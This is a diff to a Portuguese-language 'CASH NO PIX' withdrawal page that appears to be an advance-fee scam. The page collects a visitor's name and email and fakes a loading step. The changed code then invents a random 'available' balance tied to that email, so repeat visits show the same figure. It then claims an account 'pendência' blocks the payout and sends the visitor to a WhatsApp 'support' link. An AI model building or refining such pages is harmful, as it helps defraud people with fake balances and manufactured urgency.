@@ -37,16 +37,15 @@
             box-shadow: 0 20px 40px rgba(0,0,0,0.6);
         }
 
-        /* VALOR EM DESTAQUE */
-        .amount-highlight {
-            font-size: 2.8rem;
+        .text-header {
+            font-size: 1.2rem;
             font-weight: 800;
-            color: var(--neon-green);
-            margin: 15px 0;
-            text-shadow: 0 0 20px rgba(57, 255, 20, 0.2);
+            color: var(--white);
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+            text-transform: uppercase;
         }
 
-        /* ESTILO DOS INPUTS */
         .input-group { text-align: left; margin-bottom: 18px; }
         label { font-size: 0.75rem; color: var(--text-gray); letter-spacing: 1px; margin-bottom: 8px; display: block; }
         input {
@@ -55,7 +54,6 @@
         }
         input:focus { outline: none; border-color: var(--neon-green); }
 
-        /* BOTÕES */
         .btn {
             width: 100%; padding: 18px; border: none; border-radius: 12px;
             font-size: 1rem; font-weight: 800; cursor: pointer;
@@ -65,13 +63,8 @@
             background: var(--neon-green); color: #000;
             box-shadow: 0 0 20px rgba(57, 255, 20, 0.3);
         }
-        .btn-support {
-            background: transparent; border: 2px solid var(--neon-green);
-            color: var(--neon-green); margin-top: 20px;
-        }
         .btn:hover { transform: translateY(-2px); opacity: 0.9; }
 
-        /* TELA DE PENDÊNCIA (OCULTA) */
         #pending-screen { display: none; }
 
         .status-badge {
@@ -99,8 +92,7 @@
 
 <div class="container">
     <div id="screen-form" class="card">
-        <p style="color: var(--text-gray); margin: 0;">SALDO DISPONÍVEL + BONUS EXCLUSIVOS</p>
-        <div class="amount-highlight">R$ 2.689,00</div>
+        <div class="text-header">SOLICITAÇÃO DE SAQUE ABAIXO</div>
         
         <form id="saqueForm">
             <div class="input-group">
@@ -122,12 +114,12 @@
         <p style="color: var(--text-gray); font-size: 0.9rem; line-height: 1.6;">
             Olá, <strong id="display-name" style="color: #fff;"></strong>. <br>
             Detectamos uma pendência, regularize agora e receba seu saque de <br>
-            <span style="color: var(--neon-green); font-weight: bold;">R$ 2.689,00</span>.
+            <span id="pending-amount" style="color: var(--neon-green); font-weight: bold; font-size: 1.8rem;">R$ 0,00</span>.
         </p>
         
         <div style="background: #1a1a1a; padding: 15px; border-radius: 12px; margin: 20px 0; border-left: 4px solid var(--neon-amber);">
             <p style="font-size: 0.8rem; margin: 0; color: #ccc; text-align: left;">
-                <strong>Motivo:</strong> Necessario regularizar sua conta CASH NO PIX junto ao suporte para liberar o saque imediatamente.
+                <strong>Motivo:</strong> Necessário regularizar sua conta CASH NO PIX junto ao suporte para liberar o saque imediatamente.
             </p>
         </div>
 
@@ -140,38 +132,63 @@
     const form = document.getElementById('saqueForm');
     const nomeInput = document.getElementById('nome');
     const emailInput = document.getElementById('email');
+    const pendingAmountDisplay = document.getElementById('pending-amount');
 
-    // Manter dados salvos (LocalStorage)
-    window.onload = () => {
-        nomeInput.value = localStorage.getItem('user_name') || '';
-        emailInput.value = localStorage.getItem('user_email') || '';
+    // Formatação de Moeda Brasileira
+    function formatMoney(val) {
+        return parseFloat(val).toLocaleString('pt-br', { style: 'currency', currency: 'BRL' });
     }
 
-    nomeInput.oninput = () => localStorage.setItem('user_name', nomeInput.value);
-    emailInput.oninput = () => localStorage.setItem('user_email', emailInput.value);
+    // Gerador de valor aleatório
+    function getRandomValue(min, max) {
+        return (Math.random() * (max - min) + min).toFixed(2);
+    }
+
+    // Recupera ou cria o valor vinculado ao e-mail
+    function getStoredValue(email) {
+        let savedData = JSON.parse(localStorage.getItem('user_records')) || {};
+        
+        if (!savedData[email]) {
+            savedData[email] = getRandomValue(2256.70, 5890.80);
+            localStorage.setItem('user_records', JSON.stringify(savedData));
+        }
+        return savedData[email];
+    }
+
+    window.onload = () => {
+        nomeInput.value = localStorage.getItem('user_name') || '';
+        emailInput.value = localStorage.getItem('last_email') || '';
+    };
 
     form.onsubmit = (e) => {
         e.preventDefault();
         
-        // Efeito de carregamento
+        const email = emailInput.value.trim().toLowerCase();
+        const nome = nomeInput.value.trim();
+
+        // Salva dados básicos
+        localStorage.setItem('user_name', nome);
+        localStorage.setItem('last_email', email);
+
+        // Feedback visual
         document.getElementById('btnProcurar').style.display = 'none';
         document.getElementById('loading').style.display = 'block';
 
         setTimeout(() => {
-            document.getElementById('display-name').innerText = nomeInput.value;
+            const valorCalculado = getStoredValue(email);
+            
+            document.getElementById('display-name').innerText = nome;
+            pendingAmountDisplay.innerText = formatMoney(valorCalculado);
+            
             document.getElementById('screen-form').style.display = 'none';
             document.getElementById('pending-screen').style.display = 'block';
         }, 1500);
     };
 
     function falarSuporte() {
-        // Aqui você pode colocar o link do WhatsApp ou Chat
         window.open('https://wa.me/message/O75P6QLYN27TG1', '_blank');
     }
 </script>
 
 </body>
-
 </html>
-
-
